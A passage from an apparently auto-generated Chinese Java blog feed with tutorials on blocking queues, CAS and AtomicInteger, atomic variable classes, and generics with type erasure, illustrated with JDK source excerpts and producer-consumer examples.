<p>  第一行代码是试图把存放当前元素的s节点作为tail节点。第二行代码是让CPU自旋等待消费者消费元素。因为自旋会消耗CPU，所以自旋一定的次数后使用Thread.yield()方法来暂停当前正在执行的线程，并执行其他线程。 tryTransfer方法。则是用来试探下生产者传入的元素是否能直接传给消费者。如果没有消费者等待接收元素，则返回false。和transfer方法的区别是tryTransfer方法无论消费者是否接收，方法立即返回。而transfer方法是必须等到消费者消费了才返回。 对于带有时间限制的tryTransfer(E e, long timeout, TimeUnit unit)方法，则是试图把生产者传入的元素直接传给消费者，但是如果没有消费者消费该元素则等待指定的时间再返回，如果超时还没消费元素，则返回false，如果在超时时间内消费了元素，则返回true。</p>
<h4 id="LinkedBlockingDeque"><a href="#LinkedBlockingDeque" class="headerlink" title="LinkedBlockingDeque"></a><strong>LinkedBlockingDeque</strong></h4><p>是一个由链表结构组成的双向阻塞队列。所谓双向队列指的你可以从队列的两端插入和移出元素。双端队列因为多了一个操作队列的入口，在多线程同时入队时，也就减少了一半的竞争。相比其他的阻塞队列，LinkedBlockingDeque多了addFirst，addLast，offerFirst，offerLast，peekFirst，peekLast等方法，以First单词结尾的方法，表示插入，获取（peek）或移除双端队列的第一个元素。以Last单词结尾的方法，表示插入，获取或移除双端队列的最后一个元素。另外插入方法add等同于addLast，移除方法remove等效于removeFirst。但是take方法却等同于takeFirst，不知道是不是Jdk的bug，使用时还是用带有First和Last后缀的方法更清楚。 在初始化LinkedBlockingDeque时可以设置容量防止其过渡膨胀。另外双向阻塞队列可以运用在“工作窃取”模式中。</p>
<h3 id="3-阻塞队列的实现原理（JDK1-7）"><a href="#3-阻塞队列的实现原理（JDK1-7）" class="headerlink" title="3.阻塞队列的实现原理（JDK1.7）"></a><strong>3.阻塞队列的实现原理（JDK1.7）</strong></h3><p>以ArrayBlockingQueue为例，我们先来看看代码：</p>
<p>public class ArrayBlockingQueue<E> extends AbstractQueue<E><br>        implements BlockingQueue<E>, java.io.Serializable {</p>
<pre><code>private static final long serialVersionUID = -817911632652898426L;
/\*\* The queued items */
final Object\[\] items;
/\*\* items index for next take, poll, peek or remove */
int takeIndex;
/\*\* items index for next put, offer, or add */
int putIndex;
/\*\* Number of elements in the queue */
int count;
final ReentrantLock lock;
/\*\* Condition for waiting takes */
private final Condition notEmpty;
/\*\* Condition for waiting puts */
private final Condition notFull;</code></pre>
<p> …省略<br> }</p>
<p>  从上面代码可以看出ArrayBlockingQueue是维护一个Object类型的数组，takeIndex和putIndex分别表示队首元素和队尾元素的下标，count表示队列中元素的个数，lock则是一个可重入锁，notEmpty和notFull是等待条件。接下来我们看看关键方法put：</p>
<pre><code>public void put(E e) throws InterruptedException &#123;
    if (e == null) throw new NullPointerException();
    final ReentrantLock lock = this.lock;
    lock.lockInterruptibly();
    try &#123;
        while (count == items.length)
            notFull.await();
        enqueue(e);
    &#125; finally &#123;
        lock.unlock();
    &#125;
&#125;</code></pre>
<p>  从put方法的实现可以看出，它先获取了锁，并且获取的是可中断锁，然后判断当前元素个数是否等于数组的长度，如果相等，则调用notFull.await()进行等待，当被其他线程唤醒时，通过enqueue(e)方法插入元素，最后解锁。</p>
<p> /**<br>     * Inserts element at current put position, advances, and signals.<br>     * Call only when holding lock.<br>     */<br>    private void enqueue(E x) {<br>        // assert lock.getHoldCount() == 1;<br>        // assert items[putIndex] == null;<br>        final Object[] items = this.items;<br>        items[putIndex] = x;<br>        if (++putIndex == items.length) putIndex = 0;<br>        count++;<br>        notEmpty.signal();<br>    }</p>
<p>  插入成功后，通过notEmpty唤醒正在等待取元素的线程。再来看看take方法：</p>
<p> public E take() throws InterruptedException {<br>        final ReentrantLock lock = this.lock;<br>        lock.lockInterruptibly();<br>        try {<br>            while (count == 0)<br>                notEmpty.await();<br>            return dequeue();<br>        } finally {<br>            lock.unlock();<br>        }<br>    }</p>
<p>跟put方法实现类似，put方法等待的是notFull信号，而take方法等待的是notEmpty信号。在take方法中，如果可以取元素，则通过dequeue方法取得元素，下面是dequeue方法的实现：</p>
<p> private E dequeue() {<br>        // assert lock.getHoldCount() == 1;<br>        // assert items[takeIndex] != null;<br>        final Object[] items = this.items;<br>        @SuppressWarnings(“unchecked”)<br>        E x = (E) items[takeIndex];<br>        items[takeIndex] = null;<br>        if (++takeIndex == items.length) takeIndex = 0;<br>        count–;<br>        if (itrs != null)<br>            itrs.elementDequeued();<br>        notFull.signal();<br>        return x;<br>    }</p>
<p> </p>
<h3 id="4-阻塞队列的使用场景"><a href="#4-阻塞队列的使用场景" class="headerlink" title="4.阻塞队列的使用场景"></a><strong>4.阻塞队列的使用场景</strong></h3><p>除了线程池的实现使用阻塞队列之外，我们可以在生产者-消费者模式来使用阻塞队列，首先使用Object.wait()、Object.notify()和非阻塞队列实现生产者-消费者模式：</p>
<p>public class Test {<br>    private int queueSize = 10;<br>    private PriorityQueue<Integer> queue = new PriorityQueue<Integer>(queueSize);<br>    public static void main(String[] args)  {<br>        Test test = new Test();<br>        Producer producer = test.new Producer();<br>        Consumer consumer = test.new Consumer();<br>        producer.start();<br>        consumer.start();<br>    }</p>
<pre><code>class Consumer extends Thread&#123;         
    @Override
    public void run() &#123;
        while(true)&#123;
            synchronized (queue) &#123;
                while(queue.size() == 0)&#123;
                    try &#123;
                        System.out.println(&quot;队列空，等待数据&quot;);
                        queue.wait();
                    &#125; catch (InterruptedException e) &#123;
                        e.printStackTrace();
                        queue.notify();
                    &#125;
                &#125;
                queue.poll();          //每次移走队首元素
                queue.notify();
            &#125;
        &#125;
    &#125;
&#125;

class Producer extends Thread&#123;       
    @Override
    public void run() &#123;
        while(true)&#123;
            synchronized (queue) &#123;
                while(queue.size() == queueSize)&#123;
                    try &#123;
                        System.out.println(&quot;队列满，等待有空余空间&quot;);
                        queue.wait();
                    &#125; catch (InterruptedException e) &#123;
                        e.printStackTrace();
                        queue.notify();
                    &#125;
                &#125;
                queue.offer(1);        //每次插入一个元素
                queue.notify();
            &#125;
        &#125;
    &#125;
&#125;       </code></pre>
<p>}</p>
<p>  下面是使用阻塞队列实现的生产者-消费者模式：</p>
<p>public class Test {<br>    private int queueSize = 10;<br>    private ArrayBlockingQueue<Integer> queue = new ArrayBlockingQueue<Integer>(queueSize);<br>    public static void main(String[] args)  {<br>        Test test = new Test();<br>        Producer producer = test.new Producer();<br>        Consumer consumer = test.new Consumer();<br>        producer.start();<br>        consumer.start();<br>    }</p>
<pre><code>class Consumer extends Thread&#123;  
    @Override
    public void run() &#123;
        while(true)&#123;
            try &#123;
                queue.take();
            &#125; catch (InterruptedException e) &#123;
                e.printStackTrace();
            &#125;
        &#125;
    &#125;   
&#125;

class Producer extends Thread&#123;    
    @Override
    public void run() &#123;         
        while(true)&#123;
            try &#123;
                queue.put(1);
            &#125; catch (InterruptedException e) &#123;
                e.printStackTrace();
            &#125;
        &#125;
    &#125;     
&#125;</code></pre>
<p>}</p>
<p>  显然使用阻塞队列实现不需要单独考虑同步和线程间通信的问题。</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA并发</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>CAS 与 AtomicInteger（乐观锁）</title>
    <url>/2017/06/04/cas-%E4%B8%8E-atomicinteger%EF%BC%88%E4%B9%90%E8%A7%82%E9%94%81%EF%BC%89/</url>
    <content><![CDATA[<h1 id="悲观锁与乐观锁"><a href="#悲观锁与乐观锁" class="headerlink" title="悲观锁与乐观锁"></a>悲观锁与乐观锁</h1><p>我们都知道，cpu是时分复用的，也就是把cpu的时间片，分配给不同的thread/process轮流执行，时间片与时间片之间，需要进行cpu切换，也就是会发生进程的切换。切换涉及到清空寄存器，缓存数据。然后重新加载新的thread所需数据。当一个线程被挂起时，加入到阻塞队列，在一定的时间或条件下，在通过notify()，notifyAll()唤醒回来。 </p>
<p><strong>在某个资源不可用的时候，就将cpu让出，把当前等待线程切换为阻塞状态。等到资源(比如一个共享数据）可用了，那么就将线程唤醒，让他进入runnable状态等待cpu调度。这就是典型的悲观锁的实现。</strong> </p>
<p>独占锁是一种悲观锁，synchronized就是一种独占锁，它假设最坏的情况，并且只有在确保其它线程不会造成干扰的情况下执行，会导致其它所有需要锁的线程挂起，等待持有锁的线程释放锁。 <strong>但是，由于在进程挂起和恢复执行过程中存在着很大的开销。</strong> 当一个线程正在等待锁时，它不能做任何事，所以悲观锁有很大的缺点。举个例子，如果一个线程需要某个资源，但是这个资源的占用时间很短，当线程第一次抢占这个资源时，可能这个资源被占用，如果此时挂起这个线程，可能立刻就发现资源可用，然后又需要花费很长的时间重新抢占锁，时间代价就会非常的高。 所以就有了乐观锁的概念，他的核心思路就是，每次不加锁而是假设没有冲突而去完成某项操作，<strong>如果因为冲突失败就重试，直到成功为止。</strong> 在上面的例子中，某个线程可以不让出cpu,而是一直while循环，如果失败就重试，直到成功为止。<strong>所以，当数据争用不严重时，乐观锁效果更好。</strong> 比如CAS就是一种乐观锁思想的应用。</p>
<h1 id="Java中CAS的实现"><a href="#Java中CAS的实现" class="headerlink" title="Java中CAS的实现"></a>Java中CAS的实现</h1><p>CAS就是Compare and Swap的意思，比较并操作。很多的cpu直接支持CAS指令。CAS是项乐观锁技术，当多个线程尝试使用CAS同时更新同一个变量时，只有其中一个线程能更新变量的值，而其它线程都失败， <strong>失败的线程并不会被挂起，而是被告知这次竞争中失败，并可以再次尝试。</strong> <strong>CAS有3个操作数，内存值V，旧的预期值A，要修改的新值B。当且仅当预期值A和内存值V相同时，将内存值V修改为B，否则什么都不做。</strong> JDK1.5中引入了底层的支持，在int、long和对象的引用等类型上都公开了CAS的操作，并且JVM把它们编译为底层硬件提供的最有效的方法，在运行CAS的平台上，运行时把它们编译为相应的机器指令。在java.util.concurrent.atomic包下面的所有的原子变量类型中，比如AtomicInteger，都使用了这些底层的JVM支持为数字类型的引用类型提供一种高效的CAS操作。</p>
<h1 id="ABA-问题"><a href="#ABA-问题" class="headerlink" title="ABA 问题"></a>ABA 问题</h1><p>在CAS操作中，会出现ABA问题。 <strong>就是如果V的值先由A变成B，再由B变成A，那么仍然认为是发生了变化，并需要重新执行算法中的步骤。</strong> <strong>有简单的解决方案：不是更新某个引用的值，而是更新两个值，包括一个引用和一个版本号，即使这个值由A变为B，然后为变为A，版本号也是不同的。</strong> AtomicStampedReference和AtomicMarkableReference支持在两个变量上执行原子的条件更新。AtomicStampedReference更新一个“对象-引用”二元组，通过在引用上加上“版本号”，从而避免ABA问题，AtomicMarkableReference将更新一个“对象引用-布尔值”的二元组。</p>
<h1 id="AtomicInteger的实现"><a href="#AtomicInteger的实现" class="headerlink" title="AtomicInteger的实现"></a>AtomicInteger的实现</h1><p><strong>AtomicInteger 是一个支持原子操作的 Integer 类</strong> ，就是保证对AtomicInteger类型变量的增加和减少操作是原子性的，不会出现多个线程下的数据不一致问题。如果不使用 AtomicInteger，要实现一个按顺序获取的 ID，就必须在每次获取时进行加锁操作，以避免出现并发时获取到同样的 ID 的现象。 接下来通过源代码来看AtomicInteger具体是如何实现的原子操作。首先看incrementAndGet() 方法，下面是具体的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public final int incrementAndGet() &#123;  </span><br><span class="line">        for (;;) &#123;  </span><br><span class="line">            int current &#x3D; get();  </span><br><span class="line">            int next &#x3D; current + 1;  </span><br><span class="line">            if (compareAndSet(current, next))  </span><br><span class="line">                return next;  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  通过源码，可以知道，这个方法的做法为先获取到当前的 value 属性值，然后将 value 加 1，赋值给一个局部的 next 变量，然而，这两步都是非线程安全的，但是内部有一个死循环，不断去做compareAndSet操作，直到成功为止，也就是修改的根本在compareAndSet方法里面，compareAndSet()方法的代码如下：</p>
<pre><code>    public final boolean compareAndSet(int expect, int update) &#123;  
            return unsafe.compareAndSwapInt(this, valueOffset, expect, update);  
    &#125;  </code></pre>
<p>compareAndSet()方法调用的compareAndSwapInt()方法的声明如下，是一个native方法: <code>publicfinal native boolean compareAndSwapInt(Object var1, long var2, int var4, intvar5);</code> compareAndSet 传入的为执行方法时获取到的 value 属性值，next 为加 1 后的值， compareAndSet所做的为调用 Sun 的 UnSafe 的 compareAndSwapInt 方法来完成，此方法为 native 方法，<strong>compareAndSwapInt 基于的是CPU 的 CAS指令来实现的。</strong> 所以基于 CAS 的操作可认为是无阻塞的，一个线程的失败或挂起不会引起其它线程也失败或挂起。并且由于 CAS 操作是 CPU 原语，所以性能比较好。 类似的，还有decrementAndGet()方法。它和incrementAndGet()的区别是将 value 减 1，赋值给next 变量。 AtomicInteger中还有getAndIncrement() 和getAndDecrement() 方法，他们的实现原理和上面的两个方法完全相同，区别是返回值不同，前两个方法返回的是改变之后的值，即next。而这两个方法返回的是改变之前的值，即current。还有很多的其他方法，就不列举了。</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA并发</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA原子变量操作</title>
    <url>/2017/06/04/java%E5%8E%9F%E5%AD%90%E5%8F%98%E9%87%8F%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>Java从JDK1.5开始提供了java.util.concurrent.atomic包，定义了一些常见类型的原子变量。这些原子变量为我们提供了一种操作单一变量无锁(<em>lock-free</em>)的线程安全(<em>thread-safe</em>)方式。实际上该包下面的类为我们提供了类似<code>volatile</code>变量的特性，同时还提供了诸如<code>boolean compareAndSet(expectedValue, updateValue)</code>的功能。不使用锁实现线程安全听起来似乎很不可思议，这其实是通过CPU的compare and swap指令实现的，由于硬件指令支持当然不需要加锁了。</p>
<h3 id="主要用途：可用于多线程高并发的计数器"><a href="#主要用途：可用于多线程高并发的计数器" class="headerlink" title="主要用途：可用于多线程高并发的计数器"></a>主要用途：可用于多线程高并发的计数器</h3><p>  先不去讨论这些细节，我们来看一下原子变量的用法。一个典型的用法是可以使用原子变量轻松实现全局自增id，就像下面这样：</p>
<p>// 线程安全的序列id生成器<br>class Sequencer {<br>    private final AtomicLong sequenceNumber = new AtomicLong(0);<br>    public long next() {<br>        return sequenceNumber.getAndIncrement();<br>    }<br>}</p>
<p>上述代码利用AtomicLong创建了一个Sequencer类，不断调用该类的next()方法就可以得到线程安全的自增id，用起来非常简单直观。下面我们给出每种原子变量类型的用法说明。</p>
<h2 id="AtomicInteger-and-AtomicLong"><a href="#AtomicInteger-and-AtomicLong" class="headerlink" title="AtomicInteger and AtomicLong"></a>AtomicInteger and AtomicLong</h2><p><em>AtomicInteger_和_AtomicLong_分别代表原子类型的整型和长整型，这两个类提供十分相似的功能，仅仅是位宽不同。如上例所示，原子整型可用于多线程下全局自增id，除此之外还提供了原子_比较-赋值_等操作，诸如<code>compareAndSet(expect, update)</code>， <code>decrementAndGet()</code>，<code>getAndDecrement()</code>，<code>getAndSet(newValue)</code>等等，更全面的接口描述可参考JDK文档。需要提醒的是这些函数都是通过原子CPU指令实现，执行效率较高。 原子整型看似跟普通整型(_Integer, Long</em>)类型相似，但不能使用原子整型替代普通整型，因为原子整型是可变的，而普通整型不可变。由于这个原因，使用原子整型作为Map的key并不是个好主意。 你可能会想当然的以为应该有_AtomicFloat_和_AtomicDouble_，遗憾的是类库里并没有这两个类型，_AtomicByte_和_AtomicShort_也没有。如果需要替代方案是使用_AtomicInteger_和_AtomicLong_。可通过<code>Float.floatToRawIntBits(float)</code>和<code>Float.intBitsToFloat(int)</code>将Float存储到_AtomicInteger_中，类似的Double类型也可以存储到_AtomicLong_中。</p>
<h2 id="AtomicReference"><a href="#AtomicReference" class="headerlink" title="AtomicReference"></a>AtomicReference</h2><p>_AtomicReference_用于存放一个可以原子更新的对象引用。该类包含<code>get()</code>, <code>set()</code>, <code>compareAndSet()</code>, <code>getAndSet()</code>等原子方法来获取和更新其代表的对象引用。</p>
<h2 id="AtomicXXXArray"><a href="#AtomicXXXArray" class="headerlink" title="AtomicXXXArray"></a>AtomicXXXArray</h2><p>atomic包下面有三种原子数组：<code>AtomicIntegerArray</code>, <code>AtomicLongArra</code>, <code>AtomicReferenceArray</code>，分别代表整型、长整型和引用类型的原子数组。原子数组使得我们可以线程安全的方式去修改和访问数组里的单个元素。简单示例如下：</p>
<p>// 原子数组示例<br>AtomicLongArray longArray = new AtomicLongArray(10);// 创建长度为10的原子数组<br>longArray.set(1, 100);<br>long v = longArray.getAndIncrement(1);</p>
<p>AtomicReferenceArray<String> referenceArray = new AtomicReferenceArray&lt;&gt;(16);<br>referenceArray.set(3, “love”);<br>referenceArray.compareAndSet(3, “love”, “you”);</p>
<p> </p>
<p>简单来说原子数组就是一种支持线程安全的数组，仍然具有数组“定长”的性质，如果访问元素超过了数组的长度，将会抛出<code>IndexOutOfBoundsException</code>。你可能已经想到了，可以使用线程安全的容器来避免容量不足，我们会在后续章节介绍。</p>
<h2 id="什么是线程安全？"><a href="#什么是线程安全？" class="headerlink" title="什么是线程安全？"></a>什么是线程安全？</h2><p>线程安全是指多线程访问是时，无论线程的调度策略是什么，程序能够正确的执行。导致线程不安全的一个原因是状态不一致，如果线程A修改了某个共享变量（比如给id++），而线程B没有及时知道，就会导致B在错误的状态上执行，结果的正确性也就无法保证。原子变量为我们提供了一种保证单个状态一致的简单方式，一个线程修改了原子变量，另外的线程立即就能看到，这比通过锁实现的方式效率要高；如果要同时保证多个变量状态一致，就只能使用锁了。</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA并发</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA泛型</title>
    <url>/2017/05/30/java%E6%B3%9B%E5%9E%8B/</url>
    <content><![CDATA[<p><strong>一. 泛型概念的提出（为什么需要泛型）？</strong> 首先，我们看下下面这段简短的代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class GenericTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String\[\] args) &#123;</span><br><span class="line">        List list &#x3D; new ArrayList();</span><br><span class="line">        list.add(&quot;qqyumidi&quot;);</span><br><span class="line">        list.add(&quot;corn&quot;);</span><br><span class="line">        list.add(100);</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; list.size(); i++) &#123;</span><br><span class="line">            String name &#x3D; (String) list.get(i); &#x2F;&#x2F; 1</span><br><span class="line">            System.out.println(&quot;name:&quot; + name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义了一个List类型的集合，先向其中加入了两个字符串类型的值，随后加入一个Integer类型的值。这是完全允许的，因为此时list默认的类型为Object类型。在之后的循环中，由于忘记了之前在list中也加入了Integer类型的值或其他编码原因，很容易出现类似于//1中的错误。因为编译阶段正常，而运行时会出现“java.lang.ClassCastException”异常。因此，导致此类错误编码过程中不易发现。<br>在如上的编码过程中，我们发现主要存在两个问题： 1.当我们将一个对象放入集合中，集合不会记住此对象的类型，当再次从集合中取出此对象时，改对象的编译类型变成了Object类型，但其运行时类型任然为其本身类型。<br>2.因此，//1处取出集合元素时需要人为的强制类型转化到具体的目标类型，且很容易出现“java.lang.ClassCastException”异常。<br> <strong>那么有没有什么办法可以使集合能够记住集合内元素各类型，且能够达到只要编译时不出现问题，运行时就不会出现“java.lang.ClassCastException”异常呢？答案就是使用泛型。</strong> </p>
<p> <strong>二.什么是泛型？</strong><br> <strong>泛型，即“参数化类型”。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？顾名思义，就是将类型由原来的具体的类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。</strong> 看着好像有点复杂，首先我们看下上面那个例子采用泛型的写法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class GenericTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;*</span><br><span class="line">        List list &#x3D; new ArrayList();</span><br><span class="line">        list.add(&quot;qqyumidi&quot;);</span><br><span class="line">        list.add(&quot;corn&quot;);</span><br><span class="line">        list.add(100);</span><br><span class="line">        *&#x2F;</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; list &#x3D; new ArrayList&lt;String&gt;();</span><br><span class="line">        list.add(&quot;qqyumidi&quot;);</span><br><span class="line">        list.add(&quot;corn&quot;);</span><br><span class="line">        &#x2F;&#x2F;list.add(100);   &#x2F;&#x2F; 1  提示编译错误</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; list.size(); i++) &#123;</span><br><span class="line">            String name &#x3D; list.get(i); &#x2F;&#x2F; 2</span><br><span class="line">            System.out.println(&quot;name:&quot; + name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>采用泛型写法后，在//1处想加入一个Integer类型的对象时会出现编译错误，通过List<String>，直接限定了list集合中只能含有String类型的元素，从而在//2处无须进行强制类型转换，因为此时，集合能够记住元素的类型信息，编译器已经能够确认它是String类型了。 结合上面的泛型定义，我们知道在List<String>中，String是类型实参，也就是说，相应的List接口中肯定含有类型形参。且get()方法的返回结果也直接是此形参类型（也就是对应的传入的类型实参）。下面就来看看List接口的的具体定义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public interface List&lt;E&gt; extends Collection&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    int size();</span><br><span class="line"></span><br><span class="line">    boolean isEmpty();</span><br><span class="line"></span><br><span class="line">    boolean contains(Object o);</span><br><span class="line"></span><br><span class="line">    Iterator&lt;E&gt; iterator();</span><br><span class="line"></span><br><span class="line">    Object\[\] toArray();</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T\[\] toArray(T\[\] a);</span><br><span class="line"></span><br><span class="line">    boolean add(E e);</span><br><span class="line"></span><br><span class="line">    boolean remove(Object o);</span><br><span class="line"></span><br><span class="line">    boolean containsAll(Collection&lt;?&gt; c);</span><br><span class="line"></span><br><span class="line">    boolean addAll(Collection&lt;? extends E&gt; c);</span><br><span class="line"></span><br><span class="line">    boolean addAll(int index, Collection&lt;? extends E&gt; c);</span><br><span class="line"></span><br><span class="line">    boolean removeAll(Collection&lt;?&gt; c);</span><br><span class="line"></span><br><span class="line">    boolean retainAll(Collection&lt;?&gt; c);</span><br><span class="line"></span><br><span class="line">    void clear();</span><br><span class="line"></span><br><span class="line">    boolean equals(Object o);</span><br><span class="line"></span><br><span class="line">    int hashCode();</span><br><span class="line"></span><br><span class="line">    E get(int index);</span><br><span class="line"></span><br><span class="line">    E set(int index, E element);</span><br><span class="line"></span><br><span class="line">    void add(int index, E element);</span><br><span class="line"></span><br><span class="line">    E remove(int index);</span><br><span class="line"></span><br><span class="line">    int indexOf(Object o);</span><br><span class="line"></span><br><span class="line">    int lastIndexOf(Object o);</span><br><span class="line"></span><br><span class="line">    ListIterator&lt;E&gt; listIterator();</span><br><span class="line"></span><br><span class="line">    ListIterator&lt;E&gt; listIterator(int index);</span><br><span class="line"></span><br><span class="line">    List&lt;E&gt; subList(int fromIndex, int toIndex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，在List接口中采用泛型化定义之后，<E>中的E表示类型形参，可以接收具体的类型实参，并且此接口定义中，凡是出现E的地方均表示相同的接受自外部的类型实参。 自然的，ArrayList作为List接口的实现类，其定义形式是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; </span><br><span class="line">        implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    public boolean add(E e) &#123;</span><br><span class="line">        ensureCapacityInternal(size + 1);  &#x2F;&#x2F; Increments modCount!!</span><br><span class="line">        elementData\[size++\] &#x3D; e;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public E get(int index) &#123;</span><br><span class="line">        rangeCheck(index);</span><br><span class="line">        checkForComodification();</span><br><span class="line">        return ArrayList.this.elementData(offset + index);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;...省略掉其他具体的定义过程</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由此，我们从源代码角度明白了为什么//1处加入Integer类型对象编译错误，且//2处get()到的类型直接就是String类型了。  </p>
<p> <strong>三.自定义泛型接口、泛型类和泛型方法</strong> </p>
<p>从上面的内容中，大家已经明白了泛型的具体运作过程。也知道了接口、类和方法也都可以使用泛型去定义，以及相应的使用。是的，在具体使用时，可以分为泛型接口、泛型类和泛型方法。 自定义泛型接口、泛型类和泛型方法与上述Java源码中的List、ArrayList类似。如下，我们看一个最简单的泛型类和方法定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class GenericTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String\[\] args) &#123;</span><br><span class="line"></span><br><span class="line">        Box&lt;String&gt; name &#x3D; new Box&lt;String&gt;(&quot;corn&quot;);</span><br><span class="line">        System.out.println(&quot;name:&quot; + name.getData());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Box&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    private T data;</span><br><span class="line"></span><br><span class="line">    public Box() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Box(T data) &#123;</span><br><span class="line">        this.data &#x3D; data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public T getData() &#123;</span><br><span class="line">        return data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在泛型接口、泛型类和泛型方法的定义过程中，我们常见的如T、E、K、V等形式的参数常用于表示泛型形参，由于接收来自外部使用时候传入的类型实参。</p>
<p><strong>那么对于不同传入的类型实参，生成的相应对象实例的类型是不是一样的呢？</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class GenericTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String\[\] args) &#123;</span><br><span class="line"></span><br><span class="line">        Box&lt;String&gt; name &#x3D; new Box&lt;String&gt;(&quot;corn&quot;);</span><br><span class="line">        Box&lt;Integer&gt; age &#x3D; new Box&lt;Integer&gt;(712);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;name class:&quot; + name.getClass());      &#x2F;&#x2F; com.qqyumidi.Box</span><br><span class="line">        System.out.println(&quot;age class:&quot; + age.getClass());        &#x2F;&#x2F; com.qqyumidi.Box</span><br><span class="line">        System.out.println(name.getClass() &#x3D;&#x3D; age.getClass());    &#x2F;&#x2F; true</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由此，我们发现，在使用泛型类时，虽然传入了不同的泛型实参，但并没有真正意义上生成不同的类型，传入不同泛型实参的泛型类在内存上只有一个，即还是原来的最基本的类型（本实例中为Box），当然，在逻辑上我们可以理解成多个不同的泛型类型。 究其原因，在于Java中的泛型这一概念提出的目的，导致其只是作用于代码编译阶段，在编译过程中，对于正确检验泛型结果后，会将泛型的相关信息擦出，也就是说，成功编译过后的class文件中是不包含任何泛型信息的。泛型信息不会进入到运行时阶段。<br> <strong>对此总结成一句话：泛型类型在逻辑上看以看成是多个不同的类型，实际上都是相同的基本类型。</strong>  </p>
<p><strong>四.类型通配符</strong> </p>
<p>接着上面的结论，我们知道，Box<Number>和Box<Integer>实际上都是Box类型，现在需要继续探讨一个问题，那么在逻辑上，类似于Box<Number>和Box<Integer>是否可以看成具有父子关系的泛型类型呢？ 为了弄清这个问题，我们继续看下下面这个例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class GenericTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String\[\] args) &#123;</span><br><span class="line"></span><br><span class="line">        Box&lt;Number&gt; name &#x3D; new Box&lt;Number&gt;(99);</span><br><span class="line">        Box&lt;Integer&gt; age &#x3D; new Box&lt;Integer&gt;(712);</span><br><span class="line"></span><br><span class="line">        getData(name);</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F;The method getData(Box&lt;Number&gt;) in the type GenericTest is </span><br><span class="line">        &#x2F;&#x2F;not applicable for the arguments (Box&lt;Integer&gt;)</span><br><span class="line">        getData(age);   &#x2F;&#x2F; 1</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void getData(Box&lt;Number&gt; data)&#123;</span><br><span class="line">        System.out.println(&quot;data :&quot; + data.getData());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>我们发现，在代码//1处出现了错误提示信息：The method getData(Box<Number>) in the t ype GenericTest is not applicable for the arguments (Box<Integer>)。显然，通过提示信息，我们知道Box<Number>在逻辑上不能视为Box<Integer>的父类。那么，原因何在呢？</p>
